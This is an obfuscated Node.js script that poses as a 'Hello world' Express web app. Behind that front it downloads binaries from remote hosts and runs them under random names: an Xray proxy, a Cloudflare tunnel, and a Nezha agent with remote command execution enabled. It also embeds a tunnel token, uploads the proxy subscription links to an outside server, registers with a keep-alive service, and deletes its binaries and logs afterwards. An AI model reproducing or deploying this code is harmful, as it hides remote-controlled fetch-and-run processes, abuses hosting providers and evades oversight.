const _0x25baa3=_0x269f;function _0xa141(){const _0x3e31b6=['\x20>/dev/null\x202>&1','writeFileSync','random','https://amd64.ssss.nyc.mn/web','rm\x20-rf\x20','message','./tmp','post','unlinkSync','TunnelSecret','https://amd64.ssss.nyc.mn/v1','329694ODVIeF','org','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','4akHxTL','platform','listen','270069moyxAr','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','taskkill\x20/f\x20/im\x20','exec','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','koyeb','8443','automatic\x20access\x20task\x20added\x20successfully','success','includes','stringify','/vmess-argo','4365612FSvVAo','PROJECT_URL','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','UUID','isFile','unlink','false','\x20-p\x20','2083','tunnel.json','env','koyeb1.odiio.hidns.co','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','country_code','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tls','createWriteStream','694969tXTWZD','Hello\x20world!','FILE_PATH','forEach','direct','log','443','tcp','firefox','child_process','all','chmod','\x20-s\x20','arm','2053','https://amd64.ssss.nyc.mn/bot','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','.exe\x20>\x20nul\x202>&1','true','application/json','amd','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','base64','NEZHA_SERVER','2087','web\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x20&','catch','countryCode','none','Error\x20downloading\x20files:','xtls-rprx-vision','error','Add\x20automatic\x20access\x20task\x20faild:\x20','2096','Error\x20reading\x20boot.log:','vless','https://amd64.ssss.nyc.mn/agent','\x0avless://','/sub.txt\x20saved\x20successfully','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','AUTO_ACCESS','statSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','SERVER_PORT','Empowerment\x20failed\x20for\x20','1683695LuzMNY','send','mkdirSync','toString','6341724JPXSth','split','NEZHA_PORT','del\x20/f\x20/q\x20','ARGO_DOMAIN:','--tls','push','\x20is\x20created','aarch64','http','180pVAMKa','readFileSync','fileName','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','has','quic','pipe','list.txt','tunnel.yml','22TGAjtl','\x20is\x20running','https://arm64.ssss.nyc.mn/bot','\x20>\x20nul\x202>&1','win32','/api/add-subscriptions','fileUrl','UPLOAD_URL','Content-Type','http\x20server\x20is\x20running\x20on\x20port:','\x20successfully','set','nohup\x20','\x0aclient_secret:\x20','http://ip-api.com/json/','/dev/null','ARGO_AUTH','match','existsSync','Subscription\x20uploaded\x20successfully','utf-8','response','\x20>/dev/null\x202>&1\x20&','get','\x22\x20>\x20/dev/null\x202>&1','floor','/tunnel.yml\x20run','App\x20is\x20running','/vless-argo','https://ipapi.co/json/','unshift','/vmess-argo?ed=2560','8904f7a7-d137-43a0-9bed-8e68ed87aab0','block','NAME','npm\x20running\x20error:\x20','Nodes\x20uploaded\x20successfully','/trojan-argo','arch','text/plain;\x20charset=utf-8','filter','join','close','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/api/delete-nodes','\x0a\x20\x20\x20\x20','SUB_PATH','data','Unhandled\x20error\x20in\x20startserver:','test','PORT','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','length','charAt','https://arm64.ssss.nyc.mn/v1','\x0a\x0atrojan://','1193951AjEDWC','\x20already\x20exists','clear','arm64','status','ARGO_PORT','Download\x20','from','127.0.0.1','\x20failed:\x20','freedom','175ktFfKd','path','\x0a\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','boot.log','Error\x20executing\x20command:\x20','readdirSync','CFPORT','8kUcxYJ','stream','\x0a\x20\x20credentials-file:\x20','&fp=firefox&type=ws&host=','util','Empowerment\x20success\x20for\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','config.json'];_0xa141=function(){return _0x3e31b6;};return _0xa141();}(function(_0x54bca3,_0x4c840f){const _0x33f231=_0x269f,_0x12d1ac=_0x54bca3();while(!![]){try{const _0x2b2773=parseInt(_0x33f231(0x260))/0x1+-parseInt(_0x33f231(0x228))/0x2*(parseInt(_0x33f231(0x28c))/0x3)+-parseInt(_0x33f231(0x289))/0x4*(parseInt(_0x33f231(0x211))/0x5)+parseInt(_0x33f231(0x286))/0x6*(-parseInt(_0x33f231(0x26b))/0x7)+parseInt(_0x33f231(0x273))/0x8*(parseInt(_0x33f231(0x215))/0x9)+parseInt(_0x33f231(0x21f))/0xa*(parseInt(_0x33f231(0x1e2))/0xb)+parseInt(_0x33f231(0x298))/0xc;if(_0x2b2773===_0x4c840f)break;else _0x12d1ac['push'](_0x12d1ac['shift']());}catch(_0x42bc34){_0x12d1ac['push'](_0x12d1ac['shift']());}}}(_0xa141,0xaaa0d));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x25baa3(0x26c)),{promisify}=require(_0x25baa3(0x277)),exec=promisify(require(_0x25baa3(0x1eb))[_0x25baa3(0x28f)]),{execSync}=require(_0x25baa3(0x1eb)),UPLOAD_URL=process['env'][_0x25baa3(0x22f)]||'',PROJECT_URL=process['env'][_0x25baa3(0x299)]||'',AUTO_ACCESS=process[_0x25baa3(0x1da)][_0x25baa3(0x20c)]||![],FILE_PATH=process[_0x25baa3(0x1da)][_0x25baa3(0x1e4)]||_0x25baa3(0x281),SUB_PATH=process[_0x25baa3(0x1da)][_0x25baa3(0x256)]||'sub',PORT=process[_0x25baa3(0x1da)][_0x25baa3(0x20f)]||process[_0x25baa3(0x1da)][_0x25baa3(0x25a)]||0xbb8,UUID=process[_0x25baa3(0x1da)][_0x25baa3(0x1d3)]||_0x25baa3(0x248),NEZHA_SERVER=process['env'][_0x25baa3(0x1fa)]||'',NEZHA_PORT=process[_0x25baa3(0x1da)][_0x25baa3(0x217)]||'',NEZHA_KEY=process[_0x25baa3(0x1da)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x25baa3(0x1da)]['ARGO_DOMAIN']||_0x25baa3(0x1db),ARGO_AUTH=process['env'][_0x25baa3(0x238)]||'eyJhIjoiZjkyZmQ0N2QxYmRmNTY1MmU3NjVhYTMzNGNjN2QyYmMiLCJ0IjoiMzM1ZTgwNjctYTFkZi00MTcxLWI0ZGEtZDViMDM1ODE5OTQzIiwicyI6Ik16WXlaVGc0TXpJdE9EQTRNQzAwWlRKbUxXSTVZV0V0TkRBNFlqY3lOMlJtTmpneCJ9',ARGO_PORT=process[_0x25baa3(0x1da)][_0x25baa3(0x265)]||0x1f41,CFIP=process[_0x25baa3(0x1da)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x25baa3(0x1da)][_0x25baa3(0x272)]||0x1bb,NAME=process['env'][_0x25baa3(0x24a)]||_0x25baa3(0x291);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x25baa3(0x1e7)](FILE_PATH+_0x25baa3(0x21c))):console[_0x25baa3(0x1e7)](FILE_PATH+_0x25baa3(0x261));function generateRandomName(){const _0x3aa94e=_0x25baa3,_0x5a0a5f='abcdefghijklmnopqrstuvwxyz';let _0x284134='';for(let _0x167dd0=0x0;_0x167dd0<0x6;_0x167dd0++){_0x284134+=_0x5a0a5f['charAt'](Math[_0x3aa94e(0x241)](Math[_0x3aa94e(0x27d)]()*_0x5a0a5f['length']));}return _0x284134;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x25baa3(0x251)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x25baa3(0x251)](FILE_PATH,botName),subPath=path[_0x25baa3(0x251)](FILE_PATH,'sub.txt'),listPath=path[_0x25baa3(0x251)](FILE_PATH,_0x25baa3(0x226)),bootLogPath=path[_0x25baa3(0x251)](FILE_PATH,'boot.log'),configPath=path[_0x25baa3(0x251)](FILE_PATH,'config.json');function deleteNodes(){const _0x34b320=_0x25baa3;try{if(!UPLOAD_URL)return;if(!fs[_0x34b320(0x23a)](subPath))return;let _0x5c713a;try{_0x5c713a=fs[_0x34b320(0x220)](subPath,_0x34b320(0x23c));}catch{return null;}const _0x484aea=Buffer[_0x34b320(0x267)](_0x5c713a,_0x34b320(0x1f9))[_0x34b320(0x214)](_0x34b320(0x23c)),_0x13ccca=_0x484aea['split']('\x0a')[_0x34b320(0x250)](_0x395b78=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x34b320(0x259)](_0x395b78));if(_0x13ccca[_0x34b320(0x25c)]===0x0)return;return axios[_0x34b320(0x282)](UPLOAD_URL+_0x34b320(0x254),JSON['stringify']({'nodes':_0x13ccca}),{'headers':{'Content-Type':'application/json'}})[_0x34b320(0x1fe)](_0x333860=>{return null;}),null;}catch(_0x2111ac){return null;}}function cleanupOldFiles(){const _0x251aae=_0x25baa3;try{const _0x4129bc=fs[_0x251aae(0x271)](FILE_PATH);_0x4129bc[_0x251aae(0x1e5)](_0x10227a=>{const _0x1b0f8d=_0x251aae,_0x48e600=path[_0x1b0f8d(0x251)](FILE_PATH,_0x10227a);try{const _0x178764=fs[_0x1b0f8d(0x20d)](_0x48e600);_0x178764[_0x1b0f8d(0x1d4)]()&&fs[_0x1b0f8d(0x283)](_0x48e600);}catch(_0x4f1e2f){}});}catch(_0x30dd04){}}app[_0x25baa3(0x23f)]('/',function(_0x297d74,_0x20f923){const _0x1dac98=_0x25baa3;_0x20f923['send'](_0x1dac98(0x1e3));});async function generateConfig(){const _0x13121d=_0x25baa3,_0x30b8fb={'log':{'access':_0x13121d(0x237),'error':_0x13121d(0x237),'loglevel':_0x13121d(0x200)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x13121d(0x202)}],'decryption':_0x13121d(0x200),'fallbacks':[{'dest':0xbb9},{'path':_0x13121d(0x244),'dest':0xbba},{'path':_0x13121d(0x297),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x13121d(0x1e9)}},{'port':0xbb9,'listen':_0x13121d(0x268),'protocol':_0x13121d(0x207),'settings':{'clients':[{'id':UUID}],'decryption':_0x13121d(0x200)},'streamSettings':{'network':'tcp','security':_0x13121d(0x200)}},{'port':0xbba,'listen':_0x13121d(0x268),'protocol':_0x13121d(0x207),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x13121d(0x200)},'streamSettings':{'network':'ws','security':_0x13121d(0x200),'wsSettings':{'path':_0x13121d(0x244)}},'sniffing':{'enabled':!![],'destOverride':[_0x13121d(0x21e),_0x13121d(0x1e0),_0x13121d(0x224)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x13121d(0x21e),_0x13121d(0x1e0),_0x13121d(0x224)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x13121d(0x24d)}},'sniffing':{'enabled':!![],'destOverride':[_0x13121d(0x21e),_0x13121d(0x1e0),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x13121d(0x26a),'tag':_0x13121d(0x1e6)},{'protocol':'blackhole','tag':_0x13121d(0x249)}]};fs['writeFileSync'](path[_0x13121d(0x251)](FILE_PATH,_0x13121d(0x27a)),JSON[_0x13121d(0x296)](_0x30b8fb,null,0x2));}function getSystemArchitecture(){const _0x21d851=_0x25baa3,_0x18882b=os[_0x21d851(0x24e)]();return _0x18882b===_0x21d851(0x1ef)||_0x18882b===_0x21d851(0x263)||_0x18882b===_0x21d851(0x21d)?_0x21d851(0x1ef):_0x21d851(0x1f7);}function downloadFile(_0x4e9515,_0x47ac6c,_0x3a98c5){const _0x343bef=_0x25baa3,_0x3c11bd=_0x4e9515;!fs['existsSync'](FILE_PATH)&&fs[_0x343bef(0x213)](FILE_PATH,{'recursive':!![]});const _0x3fb181=fs[_0x343bef(0x1e1)](_0x3c11bd);axios({'method':'get','url':_0x47ac6c,'responseType':_0x343bef(0x274)})['then'](_0x40c645=>{const _0x3b852a=_0x343bef;_0x40c645['data'][_0x3b852a(0x225)](_0x3fb181),_0x3fb181['on']('finish',()=>{const _0x44d44c=_0x3b852a;_0x3fb181[_0x44d44c(0x252)](),console['log'](_0x44d44c(0x266)+path['basename'](_0x3c11bd)+_0x44d44c(0x232)),_0x3a98c5(null,_0x3c11bd);}),_0x3fb181['on'](_0x3b852a(0x203),_0x1a8aa4=>{const _0x1d2e0b=_0x3b852a;fs[_0x1d2e0b(0x1d5)](_0x3c11bd,()=>{});const _0x4b8292=_0x1d2e0b(0x266)+path['basename'](_0x3c11bd)+_0x1d2e0b(0x269)+_0x1a8aa4[_0x1d2e0b(0x280)];console['error'](_0x4b8292),_0x3a98c5(_0x4b8292);});})[_0x343bef(0x1fe)](_0x35996d=>{const _0xcac520=_0x343bef,_0x100722='Download\x20'+path['basename'](_0x3c11bd)+_0xcac520(0x269)+_0x35996d[_0xcac520(0x280)];console['error'](_0x100722),_0x3a98c5(_0x100722);});}async function downloadFilesAndRun(){const _0x237403=_0x25baa3,_0x11ffbd=getSystemArchitecture(),_0x480e4f=getFilesForArchitecture(_0x11ffbd);if(_0x480e4f[_0x237403(0x25c)]===0x0){console[_0x237403(0x1e7)](_0x237403(0x25b));return;}const _0x4aab22=_0x480e4f['map'](_0x1ffca4=>{return new Promise((_0x16a1c1,_0x3bdc2b)=>{const _0x4d212b=_0x269f;downloadFile(_0x1ffca4[_0x4d212b(0x221)],_0x1ffca4[_0x4d212b(0x22e)],(_0x232d5a,_0x415e7f)=>{_0x232d5a?_0x3bdc2b(_0x232d5a):_0x16a1c1(_0x415e7f);});});});try{await Promise[_0x237403(0x1ec)](_0x4aab22);}catch(_0x1b23eb){console[_0x237403(0x203)](_0x237403(0x201),_0x1b23eb);return;}function _0x47fba5(_0x22a7c3){const _0x176d7e=_0x237403,_0x247af8=0x1fd;_0x22a7c3[_0x176d7e(0x1e5)](_0x27cf68=>{const _0x179ffc=_0x176d7e;fs[_0x179ffc(0x23a)](_0x27cf68)&&fs[_0x179ffc(0x1ed)](_0x27cf68,_0x247af8,_0x14506e=>{const _0x6f830d=_0x179ffc;_0x14506e?console[_0x6f830d(0x203)](_0x6f830d(0x210)+_0x27cf68+':\x20'+_0x14506e):console[_0x6f830d(0x1e7)](_0x6f830d(0x278)+_0x27cf68+':\x20'+_0x247af8['toString'](0x8));});});}const _0x88c063=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x47fba5(_0x88c063);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x276757=NEZHA_SERVER[_0x237403(0x295)](':')?NEZHA_SERVER[_0x237403(0x216)](':')['pop']():'',_0x3334f7=new Set([_0x237403(0x1e8),'8443',_0x237403(0x205),_0x237403(0x1fb),_0x237403(0x1d8),_0x237403(0x1f0)]),_0x38b255=_0x3334f7[_0x237403(0x223)](_0x276757)?_0x237403(0x1f5):_0x237403(0x1d6),_0x585993=_0x237403(0x235)+NEZHA_KEY+_0x237403(0x222)+NEZHA_SERVER+_0x237403(0x288)+_0x38b255+_0x237403(0x279)+UUID;fs[_0x237403(0x27c)](path[_0x237403(0x251)](FILE_PATH,'config.yaml'),_0x585993);const _0x2a68fa=_0x237403(0x234)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x237403(0x28d);try{await exec(_0x2a68fa),console[_0x237403(0x1e7)](phpName+_0x237403(0x229)),await new Promise(_0x3acfb4=>setTimeout(_0x3acfb4,0x3e8));}catch(_0x57d074){console[_0x237403(0x203)]('php\x20running\x20error:\x20'+_0x57d074);}}else{let _0x56b442='';const _0x522e86=[_0x237403(0x1e8),_0x237403(0x292),_0x237403(0x205),_0x237403(0x1fb),'2083',_0x237403(0x1f0)];_0x522e86[_0x237403(0x295)](NEZHA_PORT)&&(_0x56b442=_0x237403(0x21a));const _0x47d198='nohup\x20'+npmPath+_0x237403(0x1ee)+NEZHA_SERVER+':'+NEZHA_PORT+_0x237403(0x1d7)+NEZHA_KEY+'\x20'+_0x56b442+_0x237403(0x253);try{await exec(_0x47d198),console[_0x237403(0x1e7)](npmName+_0x237403(0x229)),await new Promise(_0x7e294c=>setTimeout(_0x7e294c,0x3e8));}catch(_0x22901d){console[_0x237403(0x203)](_0x237403(0x24b)+_0x22901d);}}}else console[_0x237403(0x1e7)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5c2797=_0x237403(0x234)+webPath+'\x20-c\x20'+FILE_PATH+_0x237403(0x1fd);try{await exec(_0x5c2797),console[_0x237403(0x1e7)](webName+_0x237403(0x229)),await new Promise(_0x55225e=>setTimeout(_0x55225e,0x3e8));}catch(_0x3e6018){console['error'](_0x237403(0x1fc)+_0x3e6018);}if(fs[_0x237403(0x23a)](botPath)){let _0x30663a;if(ARGO_AUTH[_0x237403(0x239)](/^[A-Z0-9a-z=]{120,250}$/))_0x30663a=_0x237403(0x26e)+ARGO_AUTH;else ARGO_AUTH[_0x237403(0x239)](/TunnelSecret/)?_0x30663a=_0x237403(0x1f8)+FILE_PATH+_0x237403(0x242):_0x30663a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x237403(0x234)+botPath+'\x20'+_0x30663a+_0x237403(0x23e)),console[_0x237403(0x1e7)](botName+'\x20is\x20running'),await new Promise(_0x45f66c=>setTimeout(_0x45f66c,0x7d0));}catch(_0x45c251){console['error'](_0x237403(0x270)+_0x45c251);}}await new Promise(_0xef50d3=>setTimeout(_0xef50d3,0x1388));}function getFilesForArchitecture(_0x543904){const _0x55a836=_0x25baa3;let _0x55a2ac;_0x543904==='arm'?_0x55a2ac=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x55a836(0x22a)}]:_0x55a2ac=[{'fileName':webPath,'fileUrl':_0x55a836(0x27e)},{'fileName':botPath,'fileUrl':_0x55a836(0x1f1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x457dea=_0x543904===_0x55a836(0x1ef)?'https://arm64.ssss.nyc.mn/agent':_0x55a836(0x208);_0x55a2ac[_0x55a836(0x246)]({'fileName':npmPath,'fileUrl':_0x457dea});}else{const _0x285b7c=_0x543904===_0x55a836(0x1ef)?_0x55a836(0x25e):_0x55a836(0x285);_0x55a2ac[_0x55a836(0x246)]({'fileName':phpPath,'fileUrl':_0x285b7c});}}return _0x55a2ac;}function argoType(){const _0x196074=_0x25baa3;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x196074(0x1e7)](_0x196074(0x20b));return;}if(ARGO_AUTH[_0x196074(0x295)](_0x196074(0x284))){fs['writeFileSync'](path['join'](FILE_PATH,_0x196074(0x1d9)),ARGO_AUTH);const _0x2174c2='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x196074(0x216)]('\x22')[0xb]+_0x196074(0x275)+path['join'](FILE_PATH,_0x196074(0x1d9))+_0x196074(0x1d2)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x196074(0x1dc);fs[_0x196074(0x27c)](path['join'](FILE_PATH,_0x196074(0x227)),_0x2174c2);}else console['log'](_0x196074(0x1df));}async function extractDomains(){const _0x1f5d4f=_0x25baa3;let _0x450bce;if(ARGO_AUTH&&ARGO_DOMAIN)_0x450bce=ARGO_DOMAIN,console[_0x1f5d4f(0x1e7)](_0x1f5d4f(0x219),_0x450bce),await _0x58c08e(_0x450bce);else try{const _0x30f64a=fs[_0x1f5d4f(0x220)](path[_0x1f5d4f(0x251)](FILE_PATH,_0x1f5d4f(0x26f)),'utf-8'),_0x4d82c5=_0x30f64a[_0x1f5d4f(0x216)]('\x0a'),_0x466a0a=[];_0x4d82c5[_0x1f5d4f(0x1e5)](_0xa7317a=>{const _0x3a3b92=_0xa7317a['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3a3b92){const _0x61a873=_0x3a3b92[0x1];_0x466a0a['push'](_0x61a873);}});if(_0x466a0a['length']>0x0)_0x450bce=_0x466a0a[0x0],console['log']('ArgoDomain:',_0x450bce),await _0x58c08e(_0x450bce);else{console[_0x1f5d4f(0x1e7)](_0x1f5d4f(0x20e)),fs[_0x1f5d4f(0x283)](path[_0x1f5d4f(0x251)](FILE_PATH,'boot.log'));async function _0x299fc8(){const _0x235900=_0x1f5d4f;try{process[_0x235900(0x28a)]===_0x235900(0x22c)?await exec(_0x235900(0x28e)+botName+_0x235900(0x1f4)):await exec('pkill\x20-f\x20\x22['+botName[_0x235900(0x25d)](0x0)+']'+botName['substring'](0x1)+_0x235900(0x240));}catch(_0x4055ea){}}_0x299fc8(),await new Promise(_0x25c0a5=>setTimeout(_0x25c0a5,0xbb8));const _0x18149e=_0x1f5d4f(0x1f2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1f5d4f(0x234)+botPath+'\x20'+_0x18149e+_0x1f5d4f(0x23e)),console['log'](botName+_0x1f5d4f(0x229)),await new Promise(_0x1675f6=>setTimeout(_0x1675f6,0xbb8)),await extractDomains();}catch(_0x1d5284){console[_0x1f5d4f(0x203)](_0x1f5d4f(0x270)+_0x1d5284);}}}catch(_0x6dd1f8){console[_0x1f5d4f(0x203)](_0x1f5d4f(0x206),_0x6dd1f8);}async function _0x556466(){const _0x1e013f=_0x1f5d4f;try{const _0x151cab=await axios[_0x1e013f(0x23f)](_0x1e013f(0x245),{'timeout':0xbb8});if(_0x151cab[_0x1e013f(0x257)]&&_0x151cab[_0x1e013f(0x257)][_0x1e013f(0x1dd)]&&_0x151cab[_0x1e013f(0x257)][_0x1e013f(0x287)])return _0x151cab[_0x1e013f(0x257)]['country_code']+'_'+_0x151cab[_0x1e013f(0x257)]['org'];}catch(_0x38c893){try{const _0x9748b1=await axios[_0x1e013f(0x23f)](_0x1e013f(0x236),{'timeout':0xbb8});if(_0x9748b1['data']&&_0x9748b1['data'][_0x1e013f(0x264)]===_0x1e013f(0x294)&&_0x9748b1[_0x1e013f(0x257)][_0x1e013f(0x1ff)]&&_0x9748b1[_0x1e013f(0x257)][_0x1e013f(0x287)])return _0x9748b1[_0x1e013f(0x257)][_0x1e013f(0x1ff)]+'_'+_0x9748b1[_0x1e013f(0x257)][_0x1e013f(0x287)];}catch(_0x440e95){}}return'Unknown';}async function _0x58c08e(_0x744d41){const _0x2f4e97=await _0x556466(),_0x4c0e33=NAME?NAME+'-'+_0x2f4e97:_0x2f4e97;return new Promise(_0x1581ca=>{setTimeout(()=>{const _0x54dee5=_0x269f,_0x51b154={'v':'2','ps':''+_0x4c0e33,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x744d41,'path':_0x54dee5(0x247),'tls':'tls','sni':_0x744d41,'alpn':'','fp':_0x54dee5(0x1ea)},_0x2ad676=_0x54dee5(0x209)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x744d41+'&fp=firefox&type=ws&host='+_0x744d41+_0x54dee5(0x29a)+_0x4c0e33+_0x54dee5(0x26d)+Buffer[_0x54dee5(0x267)](JSON['stringify'](_0x51b154))[_0x54dee5(0x214)](_0x54dee5(0x1f9))+_0x54dee5(0x25f)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x744d41+_0x54dee5(0x276)+_0x744d41+_0x54dee5(0x1f3)+_0x4c0e33+_0x54dee5(0x255);console['log'](Buffer[_0x54dee5(0x267)](_0x2ad676)[_0x54dee5(0x214)](_0x54dee5(0x1f9))),fs[_0x54dee5(0x27c)](subPath,Buffer['from'](_0x2ad676)[_0x54dee5(0x214)](_0x54dee5(0x1f9))),console[_0x54dee5(0x1e7)](FILE_PATH+_0x54dee5(0x20a)),uploadNodes(),app[_0x54dee5(0x23f)]('/'+SUB_PATH,(_0x163456,_0x6868b5)=>{const _0x9f5b41=_0x54dee5,_0xa20a81=Buffer[_0x9f5b41(0x267)](_0x2ad676)[_0x9f5b41(0x214)](_0x9f5b41(0x1f9));_0x6868b5[_0x9f5b41(0x233)](_0x9f5b41(0x230),_0x9f5b41(0x24f)),_0x6868b5[_0x9f5b41(0x212)](_0xa20a81);}),_0x1581ca(_0x2ad676);},0x7d0);});}}async function uploadNodes(){const _0xb7a032=_0x25baa3;if(UPLOAD_URL&&PROJECT_URL){const _0x291bc4=PROJECT_URL+'/'+SUB_PATH,_0x4eadba={'subscription':[_0x291bc4]};try{const _0x41a4b5=await axios[_0xb7a032(0x282)](UPLOAD_URL+_0xb7a032(0x22d),_0x4eadba,{'headers':{'Content-Type':'application/json'}});return _0x41a4b5&&_0x41a4b5['status']===0xc8?(console[_0xb7a032(0x1e7)](_0xb7a032(0x23b)),_0x41a4b5):null;}catch(_0x10bca8){if(_0x10bca8['response']){if(_0x10bca8[_0xb7a032(0x23d)][_0xb7a032(0x264)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xb7a032(0x23a)](listPath))return;const _0x53d598=fs[_0xb7a032(0x220)](listPath,'utf-8'),_0x11a976=_0x53d598[_0xb7a032(0x216)]('\x0a')[_0xb7a032(0x250)](_0x16f0d3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xb7a032(0x259)](_0x16f0d3));if(_0x11a976[_0xb7a032(0x25c)]===0x0)return;const _0xce8ed7=JSON[_0xb7a032(0x296)]({'nodes':_0x11a976});try{const _0x392e1d=await axios[_0xb7a032(0x282)](UPLOAD_URL+'/api/add-nodes',_0xce8ed7,{'headers':{'Content-Type':_0xb7a032(0x1f6)}});return _0x392e1d&&_0x392e1d['status']===0xc8?(console[_0xb7a032(0x1e7)](_0xb7a032(0x24c)),_0x392e1d):null;}catch(_0xa3e25e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x124ca4=_0x269f,_0x157882=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x157882[_0x124ca4(0x21b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x157882[_0x124ca4(0x21b)](phpPath);process[_0x124ca4(0x28a)]===_0x124ca4(0x22c)?exec(_0x124ca4(0x218)+_0x157882[_0x124ca4(0x251)]('\x20')+_0x124ca4(0x22b),_0x41f4bd=>{const _0x5d5f2b=_0x124ca4;console[_0x5d5f2b(0x262)](),console[_0x5d5f2b(0x1e7)]('App\x20is\x20running'),console[_0x5d5f2b(0x1e7)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x124ca4(0x27f)+_0x157882[_0x124ca4(0x251)]('\x20')+_0x124ca4(0x27b),_0x5044b3=>{const _0x4b335c=_0x124ca4;console[_0x4b335c(0x262)](),console['log'](_0x4b335c(0x243)),console[_0x4b335c(0x1e7)](_0x4b335c(0x290));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5c1c72=_0x25baa3;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5c1c72(0x1e7)](_0x5c1c72(0x1de));return;}try{const _0x9a501c=await axios[_0x5c1c72(0x282)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x5c1c72(0x1e7)](_0x5c1c72(0x293)),_0x9a501c;}catch(_0x9d3d97){return console[_0x5c1c72(0x203)](_0x5c1c72(0x204)+_0x9d3d97[_0x5c1c72(0x280)]),null;}}function _0x269f(_0x419717,_0x5e2d78){_0x419717=_0x419717-0x1d2;const _0xa141f2=_0xa141();let _0x269f76=_0xa141f2[_0x419717];return _0x269f76;}async function startserver(){const _0x598c50=_0x25baa3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x72b529){console[_0x598c50(0x203)]('Error\x20in\x20startserver:',_0x72b529);}}startserver()['catch'](_0xa1a532=>{const _0x139b27=_0x25baa3;console[_0x139b27(0x203)](_0x139b27(0x258),_0xa1a532);}),app[_0x25baa3(0x28b)](PORT,()=>console['log'](_0x25baa3(0x231)+PORT+'!'));
